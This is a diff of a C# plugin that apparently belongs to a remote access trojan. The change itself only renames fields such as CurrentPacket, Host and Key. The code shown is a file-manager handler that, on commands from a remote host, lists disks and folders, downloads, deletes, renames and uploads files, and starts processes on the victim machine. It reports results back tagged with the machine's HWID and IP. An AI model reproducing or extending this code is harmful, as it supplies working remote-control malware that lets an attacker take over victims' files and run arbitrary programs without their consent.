@@ -16,18 +16,18 @@ namespace Plugin
         public static void Main(LoadingAPI loadingAPI)
         {
             string filePath;
-            switch (loadingAPI.currentPacket.packetType) 
+            switch (loadingAPI.CurrentPacket.PacketType) 
             {
                 case PacketType.FM_GET_DISK:
-                    DiskPacket diskPacket = new DiskPacket(GetDisks.GetAllDisks(), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, diskPacket);             
+                    DiskPacket diskPacket = new DiskPacket(GetDisks.GetAllDisks(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, diskPacket);             
                     break;
 
                 case PacketType.FM_GET_FILES_AND_DIRS:
-                    string path = ((FileManagerPacket)loadingAPI.currentPacket).path;
-                    FileManagerPacket fileManagerPacket = new FileManagerPacket(GetFilesAndDirs.GetAllFilesAndDirs(path), loadingAPI.baseIp, loadingAPI.HWID);
+                    string path = ((FileManagerPacket)loadingAPI.CurrentPacket).path;
+                    FileManagerPacket fileManagerPacket = new FileManagerPacket(GetFilesAndDirs.GetAllFilesAndDirs(path), loadingAPI.BaseIp, loadingAPI.HWID);
                     fileManagerPacket.path = path;
-                    ClientSender(loadingAPI.host, loadingAPI.key, fileManagerPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, fileManagerPacket);
                     break;
 
                 case PacketType.FM_DOWNLOAD_FILE:
@@ -35,39 +35,39 @@ namespace Plugin
                     break;
 
                 case PacketType.FM_DELETE_FILE:
-                    filePath = ((DeleteFilePacket)loadingAPI.currentPacket).path;
+                    filePath = ((DeleteFilePacket)loadingAPI.CurrentPacket).path;
                     Tuple<string, bool> returnFromFunc = DeleteFile.RemoveFile(filePath);
-                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(returnFromFunc.Item1, ((DeleteFilePacket)loadingAPI.currentPacket).name, returnFromFunc.Item2, loadingAPI.baseIp, loadingAPI.HWID, ((DeleteFilePacket)loadingAPI.currentPacket).fileTicket);
-                    ClientSender(loadingAPI.host, loadingAPI.key, deleteFilePacket);
+                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(returnFromFunc.Item1, ((DeleteFilePacket)loadingAPI.CurrentPacket).name, returnFromFunc.Item2, loadingAPI.BaseIp, loadingAPI.HWID, ((DeleteFilePacket)loadingAPI.CurrentPacket).fileTicket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, deleteFilePacket);
                     break;
 
                 case PacketType.FM_START_FILE:
-                    filePath = ((StartFilePacket)loadingAPI.currentPacket).filePath;
+                    filePath = ((StartFilePacket)loadingAPI.CurrentPacket).filePath;
                     StartFile.StartAProcess(filePath);
                     break;
 
                 case PacketType.FM_RENAME_FILE:
-                    RenameFilePacket renameFilePacketReceived = (RenameFilePacket)loadingAPI.currentPacket;
-                    RenameFilePacket renameFilePacket = new RenameFilePacket(renameFilePacketReceived.oldName, renameFilePacketReceived.oldPath, renameFilePacketReceived.newName, renameFilePacketReceived.newPath, loadingAPI.baseIp, loadingAPI.HWID)
+                    RenameFilePacket renameFilePacketReceived = (RenameFilePacket)loadingAPI.CurrentPacket;
+                    RenameFilePacket renameFilePacket = new RenameFilePacket(renameFilePacketReceived.oldName, renameFilePacketReceived.oldPath, renameFilePacketReceived.newName, renameFilePacketReceived.newPath, loadingAPI.BaseIp, loadingAPI.HWID)
                     {
                         isRenamed = MoveFile.RenameFile(renameFilePacketReceived.oldPath, renameFilePacketReceived.newPath)
                     };
-                    ClientSender(loadingAPI.host, loadingAPI.key, renameFilePacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, renameFilePacket);
                     break;
 
                 case PacketType.FM_SHORTCUT_PATH:
-                    ShortCutFileManagersPacket shortCutFileManagersPacketReceived = (ShortCutFileManagersPacket)loadingAPI.currentPacket;
+                    ShortCutFileManagersPacket shortCutFileManagersPacketReceived = (ShortCutFileManagersPacket)loadingAPI.CurrentPacket;
                     string newPath = "";
-                    ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(Shorcuts.ShortcutsWrapper(shortCutFileManagersPacketReceived.shortCuts, ref newPath), loadingAPI.baseIp, loadingAPI.HWID);
+                    ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(Shorcuts.ShortcutsWrapper(shortCutFileManagersPacketReceived.shortCuts, ref newPath), loadingAPI.BaseIp, loadingAPI.HWID);
                     shortCutFileManagersPacket.shortCuts = shortCutFileManagersPacketReceived.shortCuts;
                     shortCutFileManagersPacket.path = newPath;
-                    ClientSender(loadingAPI.host, loadingAPI.key, shortCutFileManagersPacket);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, shortCutFileManagersPacket);
                     break;
 
                 case PacketType.FM_UPLOAD_FILE:
-                    UploadFilePacket uploadFilePacketReceived = (UploadFilePacket)loadingAPI.currentPacket;
-                    UploadFilePacket uploadFilePacket = new UploadFilePacket(uploadFilePacketReceived.path, UploadFile.WriteUploadedFile(uploadFilePacketReceived.path, Compressor.QuickLZ.Decompress(uploadFilePacketReceived.file)), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, uploadFilePacket);
+                    UploadFilePacket uploadFilePacketReceived = (UploadFilePacket)loadingAPI.CurrentPacket;
+                    UploadFilePacket uploadFilePacket = new UploadFilePacket(uploadFilePacketReceived.path, UploadFile.WriteUploadedFile(uploadFilePacketReceived.path, Compressor.QuickLZ.Decompress(uploadFilePacketReceived.file)), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, uploadFilePacket);
                     break;
 
                 default:
@@ -78,8 +78,8 @@ namespace Plugin
 
         private static void ClientFileSender(LoadingAPI loadingAPI) 
         {
-            string filePath = ((DownloadFilePacket)loadingAPI.currentPacket).fileName;
-            DownloadClientHandler clientHandler = new DownloadClientHandler(loadingAPI, ((DownloadFilePacket)loadingAPI.currentPacket).fileTicket, ((DownloadFilePacket)loadingAPI.currentPacket).bufferSize);
+            string filePath = ((DownloadFilePacket)loadingAPI.CurrentPacket).fileName;
+            DownloadClientHandler clientHandler = new DownloadClientHandler(loadingAPI, ((DownloadFilePacket)loadingAPI.CurrentPacket).fileTicket, ((DownloadFilePacket)loadingAPI.CurrentPacket).bufferSize);
             clientHandler.ConnectStart();
             while (!clientHandler.Connected)
                 Thread.Sleep(125);
